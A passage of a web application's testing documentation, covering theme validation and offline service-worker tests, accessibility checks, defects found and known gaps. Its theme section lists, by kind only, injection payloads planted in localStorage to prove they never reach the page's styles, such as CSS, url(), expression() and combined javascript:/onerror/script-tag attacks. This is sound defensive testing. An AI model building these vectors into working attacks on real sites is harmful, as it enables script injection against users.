- **A real `QuotaExceededError` from a real browser.** Filling a browser's quota takes minutes and the threshold varies by machine. The error is injected instead, and the code path from the error to the UI is fully covered.
- **Eviction under storage pressure.** Not triggerable on demand. It is disclosed in the UI copy instead, and that copy is asserted.


---

## 15. M8 — theme

### The split

| Layer | Where | What it proves |
|---|---|---|
| Validation, presets, contrast maths | Unit (43) | Every rule about what a theme value may be |
| Store, application, persistence | Unit (21) | That a change reaches CSS, and only validated values do |
| The whole feature | E2E, 3 engines (40 each) | The validator wired to a real `setProperty` under the real CSP |

### The security corpus

Eighteen payloads are planted in `localStorage` and the page reloaded, each
asserting: only `#RRGGBB` reached the three colour properties, the angle is
still an integer with a unit, the intensity is still a number, no dialog
opened, no page error was thrown, no `img[src]` or inline `<script>` exists,
and the application still works.

```
CSS injection through a colour · url() · expression() · HTML fragment
style-tag escape · oversized hex · custom-property escape · null numerics
out-of-range intensity · hostile angle string · unknown preset
hostile contrast enum · future schemaVersion · malformed schemaVersion
array · bare string · unparseable JSON · empty string
```

Plus: a payload combining `javascript:`, an `onerror` image and a script tag,
asserted to open no dialog and throw no error; and a mixed record proving one
corrupt field costs only that field.

### Accessibility

axe (`wcag2a`, `wcag2aa`, `wcag21a`, `wcag21aa`) over: the drawer open, the
whole interface in **high-contrast mode**, the drawer in high-contrast mode,
and a **custom theme with the analysis panes populated**. Plus keyboard
operation of every control, focus trapping, Escape, and focus restoration.

### Two measurement notes, so the numbers are not overread

**Forced colors.** Playwright's `forcedColors: 'active'` flips the media query
but does not apply a real forced palette, so axe measures our own colours
against a mode the browser has not entered. Measured: the plain application
reports **29 color-contrast nodes** under this emulation with no theme UI on
screen at all. The rule is therefore excluded from that one test and the
structural behaviour is asserted instead. **Real forced-colors validation
needs an OS high-contrast mode and has not been performed** — it is a manual
pre-release check, listed in §12.

**Focus restoration.** WebKit on macOS does not focus a `<button>` when it is
clicked, so a mouse-opened dialog has no opener to return to on that engine.
The test opens from the keyboard, which is who focus restoration is for; all
three engines then restore correctly with no code of ours involved. An earlier
attempt to "fix" this in the `Dialog` primitive was reverted once measurement
showed the platform already did it.

### Defects these tests found

| Found by | Defect |
|---|---|
| Unit | `matchesPreset` looked up the preset the theme *claimed*, so a theme could never name a preset again after one custom edit. |
| Unit | Two store tests spied on `Storage.prototype`, which happy-dom does not route these writes through — the debounce test measured nothing and the storage-refusal test never entered its catch. |
| Audit | `setTheme` trusted its callers; `applyTheme` is a `setProperty` sink. Now revalidated at the choke point. |
| Audit | `SURFACE_HEX` was `#0d1117`; `--color-surface` is `#101613`. The contrast guard was reporting confident ratios against a background the accent is never shown on. A test now reads the value out of `tokens.css`. |
| Spec review | The contrast guard was silent when a colour passed, where §4.5 specifies "✓ Passes AA". |
| Visual review | "Amber Console" was ellipsised to "Amber Consol…". |


---

## 16. M9 — offline and the service worker

### Where these tests run, and why it is different

Every other E2E project hits `vite preview`, which serves **no headers**. A
service worker takes its CSP from the headers on its own script, so a policy
that breaks the worker is invisible to a suite served without them — and
measurably was: under the real `_headers`, the worker never activated and
cached nothing.

`scripts/serve-production.mjs` serves `dist/` with the real `public/_headers`.
The four `offline-*` projects run against it on port 4183.

One directive is dropped locally: `upgrade-insecure-requests`. On an HTTPS
origin it is a no-op belt-and-braces measure; over `http://localhost` it makes
WebKit rewrite every subresource URL to `https://localhost`, which nothing is
listening on, and the page fails to load. Chromium and Firefox exempt
localhost; WebKit does not. Every directive that governs the service worker is
served exactly as production serves it.

### Offline is real

`context.setOffline(true)`. Nothing fakes `navigator.onLine` or asserts on a
banner. With the network cut and the page reloaded, the suite runs a regex
analysis, a regex execution, a JSON analysis, a format, history read/write/
delete, a pre-paint theme check, and a mode switch. If a worker chunk were
missing from the precache, these fail the way a user would experience it.

### Isolation

Every test builds its own `BrowserContext`, so no service worker, cache,
IndexedDB or localStorage crosses between them — a cached build left by a
previous test would make an offline assertion pass for the wrong reason.

The update suite is isolated further: its own port, and its own copy of the
build under `.tmp/update-dist`. It has to rewrite the bytes the server hands
out, and `dist/` is shared with every other project — mutating it mid-run
would make an update banner appear in the middle of a history or theme test.

### Defects these tests found

| Found by | Defect |
|---|---|
| **A/B under production headers** | `connect-src 'none'` applied to `/sw.js` stopped the worker activating and caching anything, silently. Nothing in the existing suite could have caught it. |
| The missing-API test | `'serviceWorker' in navigator` is true when the property exists and is `undefined`, which is how a locked-down profile presents it. Reading through that guard threw **before first render** — a blank page over a feature the app does not need. |
| Firefox | The helper picked the precache by `keys()[0]`; a test that plants an unrelated cache made it pick the wrong one. Browsers do not agree on that order. |

### Known gaps, stated rather than papered over

**WebKit offline is not verified by automation.** Playwright 1.62.1 cannot
navigate WebKit under `setOffline` — both `reload()` and `goto()` fail with an
internal error, **and fail identically with no service worker registered**. Six
tests skip there with that measurement as the reason; seven still run. Real
Safari offline behaviour is a manual pre-release check.

**The update flow is Chromium-only**, for the isolation reason above.

**`regex-mobile › survives two timeouts in a row` fails in isolation.** This
predates M9: it fails identically at the M8 commit `a13910e`, with the PWA
plugin disabled, and passes on `regex-chromium`. It is device-emulation
specific and is an open issue against the M4 execution-timeout tests, not an
M9 regression. Recorded rather than left for someone to rediscover.
